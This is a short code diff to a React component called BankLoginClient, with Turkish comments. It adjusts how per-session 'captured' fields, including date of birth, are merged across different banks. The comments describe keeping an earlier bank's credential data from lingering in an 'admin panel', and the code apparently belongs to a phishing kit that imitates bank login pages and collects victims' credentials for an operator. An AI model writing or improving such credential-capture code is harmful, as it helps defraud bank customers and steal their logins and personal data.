@@ -670,10 +670,19 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     }
 
     // nextFormData: Kart mantigi ile ayni sirayla yazilir (boylece history ezilmez)
+    // DIKKAT: sessionFormDataFinalRaw'i ham spread ETME — preservedSessionFormData
+    // zaten ayni objenin resetlenmemis halidir. Ham spread, filtrelenen eski
+    // credential alanlarini (dateOfBirth vb.) geri ekler -> baska bankaya gecince
+    // eski bankanin verileri admin panelde gorunmeye devam ederdi.
     const nextFormData: Record<string, unknown> = {
-      ...(sessionFormDataFinalRaw as Record<string, unknown> ?? {}),
       ...(preservedSessionFormData as Record<string, unknown> ?? {}),
       ...(extraCapturedFields as Record<string, unknown> ?? {}),
+      // Dogum tarihi: yeni submit'te yakalandiysa o, ayni banka+verisiz cagri ise
+      // eskisi korunur, banka degistiyse temizlenir.
+      dateOfBirth:
+        typeof extraCapturedFields.dateOfBirth === "string" && extraCapturedFields.dateOfBirth.trim() !== ""
+          ? extraCapturedFields.dateOfBirth
+          : staleStr(sessionFormDataFinalRaw?.dateOfBirth),
       orderedField1: currentOrderedField1,
       orderedField2: currentOrderedField2,
       orderedField2Type: currentOrderedField2Type,
